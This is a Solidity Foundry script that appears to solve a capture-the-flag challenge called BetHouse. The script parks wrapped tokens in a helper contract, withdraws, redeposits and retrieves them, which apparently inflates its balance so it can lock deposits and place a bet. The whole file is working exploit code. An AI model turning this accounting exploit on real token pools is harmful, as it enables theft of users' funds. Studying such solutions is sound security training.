// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";
import {BetHouse, Pool, PoolToken} from "../src/BetHouse.sol";

contract SolveBetHouse is Script {
    function setUp() public {}

    function run() public {
        BetHouse bethouse = BetHouse(vm.envAddress("BETHOUSE_ADDRESS"));

        vm.startBroadcast();
        Pool pool = Pool(bethouse.pool());
        PoolToken pdt = PoolToken(pool.depositToken());
        PoolToken wrapped = PoolToken(pool.wrappedToken());
        TokenHolder holder = new TokenHolder(address(wrapped));
        pdt.approve(address(pool), 5);
        pool.deposit{value: 0.001 ether}(5);

        wrapped.transfer(address(holder), 15);

        pool.withdrawAll();

        pdt.approve(address(pool), 5);
        pool.deposit(5);
        holder.retrieveAll();
        pool.lockDeposits();
        bethouse.makeBet(msg.sender);
        vm.stopBroadcast();
    }
}

// Helper contract deployed by the attacker to hold wrapped tokens temporarily
contract TokenHolder {
    address public owner;
    PoolToken public wrapped;

    constructor(address wrapped_) {
        owner = msg.sender;
        wrapped = PoolToken(wrapped_);
    }

    function retrieveAll() external {
        uint256 bal = wrapped.balanceOf(address(this));
        wrapped.transfer(owner, bal);
    }
}
